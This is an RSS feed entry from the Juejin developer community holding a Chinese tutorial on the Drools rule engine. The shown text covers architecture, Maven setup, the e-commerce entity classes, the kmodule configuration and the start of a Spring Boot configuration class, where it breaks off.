<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Drools规则引擎实战指南]]></title>    <link>https://juejin.cn/post/7579906040537563182</link>    <guid>https://juejin.cn/post/7579906040537563182</guid>    <pubDate>2025-12-05T03:05:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579906040537563182" data-draft-id="7579917791764758555" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Drools规则引擎实战指南"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-05T03:05:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="雨中飘荡的记忆"/> <meta itemprop="url" content="https://juejin.cn/user/694547077666606"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Drools规则引擎实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547077666606/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    雨中飘荡的记忆
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:05:32.000Z" title="Fri Dec 05 2025 03:05:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Drools规则引擎实战指南：从入门到生产应用</h2>
<h3 data-id="heading-1">前言</h3>
<p>Drools是一个开源的业务规则管理系统（BRMS），基于Java开发，提供了强大的规则引擎能力。它将业务逻辑从代码中分离出来，使业务人员可以直接维护规则，提高了系统的灵活性和可维护性。本文将深入介绍Drools的核心概念和实战应用。</p>
<h3 data-id="heading-2">一、Drools核心架构</h3>
<h4 data-id="heading-3">1.1 整体架构图</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------------------------+</span>
<span class="hljs-operator">|</span>                    Drools Architecture                    <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>                                                          <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">------------------+      +------------------+          |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  Rules (DRL)     <span class="hljs-operator">|</span>      <span class="hljs-operator">|</span>  Fact Model      <span class="hljs-operator">|</span>          <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">-----------+   |      |  +-----------+   |          |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span> Rule <span class="hljs-number">1</span>    <span class="hljs-operator">|</span>   <span class="hljs-operator">|</span>      <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span> Java POJO <span class="hljs-operator">|</span>   <span class="hljs-operator">|</span>          <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span> Rule <span class="hljs-number">2</span>    <span class="hljs-operator">|</span>   <span class="hljs-operator">|</span>      <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span> Objects   <span class="hljs-operator">|</span>   <span class="hljs-operator">|</span>          <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span> Rule <span class="hljs-number">3</span>    <span class="hljs-operator">|</span>   <span class="hljs-operator">|</span>      <span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">-----------+   |          |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">-----------+   |      +--------+---------+          |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">--------+---------+               |                    |</span>
<span class="hljs-operator">|</span>           <span class="hljs-operator">|</span>                         <span class="hljs-operator">|</span>                    <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>           v                         v                    <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">--------+--------------------------+---------+         |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>         Knowledge Base (KieBase)           <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------+  |         |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  Compiled Rules <span class="hljs-operator">+</span> Patterns          <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------+  |         |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">--------+---------------------------------+  |         |</span>
<span class="hljs-operator">|</span>           <span class="hljs-operator">|</span>                                    <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>           v                                    <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">--------+---------------------------------+  |         |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>      Working Memory (KieSession)        <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------+  |  |         |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-keyword">Insert</span> Facts <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">Pattern</span> <span class="hljs-keyword">Match</span>   <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">Execute</span> Actions              <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------+  |  |         |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">------------------------------------------+  |         |</span>
<span class="hljs-operator">|</span>                                                <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">------------------------------------------+  |         |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>           Agenda (Rule Execution)        <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  Rule1 [priority<span class="hljs-operator">=</span><span class="hljs-number">10</span>] <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">Execute</span>          <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  Rule2 [priority<span class="hljs-operator">=</span><span class="hljs-number">5</span>]  <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">Execute</span>          <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">------------------------------------------+  |         |</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------------------------+</span>
</code></pre>
<h4 data-id="heading-4">1.2 核心组件说明</h4>
<pre><code class="hljs language-lua" lang="lua">组件层次结构:

KieServices
    |
    +<span class="hljs-comment">-- KieContainer</span>
            |
            +<span class="hljs-comment">-- KieBase (Knowledge Base)</span>
                    |
                    +<span class="hljs-comment">-- KieSession (Working Memory)</span>
                            |
                            +<span class="hljs-comment">-- Facts (业务对象)</span>
                            +<span class="hljs-comment">-- Agenda (规则执行队列)</span>
</code></pre>
<h3 data-id="heading-5">二、快速开始</h3>
<h4 data-id="heading-6">2.1 Maven依赖配置</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- pom.xml --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">drools.version</span>&gt;</span>8.44.0.Final<span class="hljs-tag">&lt;/<span class="hljs-name">drools.version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">spring.boot.version</span>&gt;</span>3.1.5<span class="hljs-tag">&lt;/<span class="hljs-name">spring.boot.version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- Drools核心依赖 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.drools<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>drools-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${drools.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.drools<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>drools-compiler<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${drools.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.drools<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>drools-mvel<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${drools.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Decision Table支持 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.drools<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>drools-decisiontables<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${drools.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring Boot集成 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${spring.boot.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.30<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h4 data-id="heading-7">2.2 项目结构</h4>
<pre><code class="hljs language-css" lang="css">drools-demo/
├── <span class="hljs-attribute">src</span>/
│   ├── <span class="hljs-selector-tag">main</span>/
│   │   ├── java/
│   │   │   └── com/example/drools/
│   │   │       ├── config/
│   │   │       │   └── DroolsConfig<span class="hljs-selector-class">.java</span>
│   │   │       ├── model/
│   │   │       │   ├── <span class="hljs-attribute">Order</span><span class="hljs-selector-class">.java</span>
│   │   │       │   ├── Customer<span class="hljs-selector-class">.java</span>
│   │   │       │   └── Product<span class="hljs-selector-class">.java</span>
│   │   │       ├── service/
│   │   │       │   └── RuleService<span class="hljs-selector-class">.java</span>
│   │   │       └── DroolsApplication<span class="hljs-selector-class">.java</span>
│   │   └── resources/
│   │       ├── rules/
│   │       │   ├── discount-rules<span class="hljs-selector-class">.drl</span>
│   │       │   ├── validation-rules<span class="hljs-selector-class">.drl</span>
│   │       │   └── promotion-rules<span class="hljs-selector-class">.drl</span>
│   │       ├── META-INF/
│   │       │   └── kmodule<span class="hljs-selector-class">.xml</span>
│   │       └── application<span class="hljs-selector-class">.yml</span>
│   └── test/
└── pom<span class="hljs-selector-class">.xml</span>
</code></pre>
<h3 data-id="heading-8">三、实体模型定义</h3>
<h4 data-id="heading-9">3.1 订单实体</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.model;

<span class="hljs-keyword">import</span> lombok.AllArgsConstructor;
<span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> lombok.NoArgsConstructor;

<span class="hljs-keyword">import</span> java.math.BigDecimal;
<span class="hljs-keyword">import</span> java.time.LocalDateTime;
<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Order</span> {
    <span class="hljs-keyword">private</span> Long orderId;
    <span class="hljs-keyword">private</span> Customer customer;
    <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">private</span> BigDecimal totalAmount;
    <span class="hljs-keyword">private</span> <span class="hljs-type">BigDecimal</span> <span class="hljs-variable">discountAmount</span> <span class="hljs-operator">=</span> BigDecimal.ZERO;
    <span class="hljs-keyword">private</span> BigDecimal finalAmount;
    <span class="hljs-keyword">private</span> String status;
    <span class="hljs-keyword">private</span> LocalDateTime orderTime;
    <span class="hljs-keyword">private</span> String promotionCode;

    <span class="hljs-comment">// 业务方法</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">calculateTotalAmount</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">this</span>.totalAmount = items.stream()
                .map(OrderItem::getSubtotal)
                .reduce(BigDecimal.ZERO, BigDecimal::add);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">applyDiscount</span><span class="hljs-params">(BigDecimal discount)</span> {
        <span class="hljs-built_in">this</span>.discountAmount = <span class="hljs-built_in">this</span>.discountAmount.add(discount);
        <span class="hljs-built_in">this</span>.finalAmount = <span class="hljs-built_in">this</span>.totalAmount.subtract(<span class="hljs-built_in">this</span>.discountAmount);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getItemCount</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> items.stream()
                .mapToInt(OrderItem::getQuantity)
                .sum();
    }
}

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderItem</span> {
    <span class="hljs-keyword">private</span> Product product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> BigDecimal price;
    <span class="hljs-keyword">private</span> BigDecimal subtotal;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">calculateSubtotal</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">this</span>.subtotal = <span class="hljs-built_in">this</span>.price.multiply(BigDecimal.valueOf(quantity));
    }
}
</code></pre>
<h4 data-id="heading-10">3.2 客户实体</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.model;

<span class="hljs-keyword">import</span> lombok.AllArgsConstructor;
<span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> lombok.NoArgsConstructor;

<span class="hljs-keyword">import</span> java.time.LocalDate;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Customer</span> {
    <span class="hljs-keyword">private</span> Long customerId;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> String level;  <span class="hljs-comment">// VIP, GOLD, SILVER, NORMAL</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> loyaltyPoints;
    <span class="hljs-keyword">private</span> LocalDate memberSince;
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> isNewCustomer;

    <span class="hljs-comment">// 业务方法</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getMemberYears</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> LocalDate.now().getYear() - memberSince.getYear();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isVip</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"VIP"</span>.equals(level);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isGold</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"GOLD"</span>.equals(level);
    }
}
</code></pre>
<h4 data-id="heading-11">3.3 产品实体</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.model;

<span class="hljs-keyword">import</span> lombok.AllArgsConstructor;
<span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> lombok.NoArgsConstructor;

<span class="hljs-keyword">import</span> java.math.BigDecimal;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {
    <span class="hljs-keyword">private</span> Long productId;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> String category;  <span class="hljs-comment">// ELECTRONICS, CLOTHING, FOOD, BOOKS</span>
    <span class="hljs-keyword">private</span> BigDecimal price;
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> onSale;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> stockQuantity;

    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isInStock</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> stockQuantity &gt; <span class="hljs-number">0</span>;
    }
}
</code></pre>
<h3 data-id="heading-12">四、Drools配置</h3>
<h4 data-id="heading-13">4.1 KModule配置文件</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- src/main/resources/META-INF/kmodule.xml --&gt;</span>
<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">kmodule</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.drools.org/xsd/kmodule"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">kbase</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"rules"</span> <span class="hljs-attr">packages</span>=<span class="hljs-string">"rules"</span> <span class="hljs-attr">default</span>=<span class="hljs-string">"true"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ksession</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ksession-rules"</span> <span class="hljs-attr">default</span>=<span class="hljs-string">"true"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"stateful"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">kbase</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">kmodule</span>&gt;</span>
</code></pre>
<h4 data-id="heading-14">4.2 Spring Boot配置类</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.config;

<span class="hljs-keyword">import</span> org.kie.api.KieServices;
<span class="hljs-keyword">import</span> org.kie.api.builder.KieBuilder;
<span class="hljs-keyword">import</span> org.kie.api.builder.KieFileSystem;
<span class="hljs-keyword">import</span> org.kie.api.builder.KieModule;
<span class="hljs-keyword">import</span> org.kie.api.runtime.KieContainer;
<span class="hljs-keyword">import</span> org.kie.api.runtime.KieSession;
<span class="hljs-keyword">import</span> org.kie.internal.io.ResourceFactory;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> org.springframework.core.io.Resource;
<span class="hljs-keyword">import</span> org.springframework.core.io.support.PathMatchingResourcePatternResolver;
<span class="hljs-keyword">import</span> org.springframework.core.io.support.ResourcePatternResolver;

<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DroolsConfig</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">RULES_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">"rules/"</span>;

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> KieContainer <span class="hljs-title function_">kieContainer</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
